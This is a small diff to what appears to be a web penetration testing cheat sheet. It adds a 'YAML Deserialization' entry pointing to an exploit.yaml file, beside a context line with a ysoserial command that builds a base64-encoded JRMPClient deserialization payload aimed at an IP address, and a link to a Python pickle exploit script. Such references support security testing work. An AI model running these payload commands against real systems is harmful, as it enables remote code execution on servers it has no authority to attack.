@@ -424,6 +424,10 @@ java -jar ysoserial-all.jar “JRMPClient” ip:80” |base64 -w0
 codes/deserialization/python/py_pickle.py
 
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/python/py_pickle.py
+
+### YAML Deserialization
+
+codes/deserialization/exploit.yaml
   
 ## Cloud
 
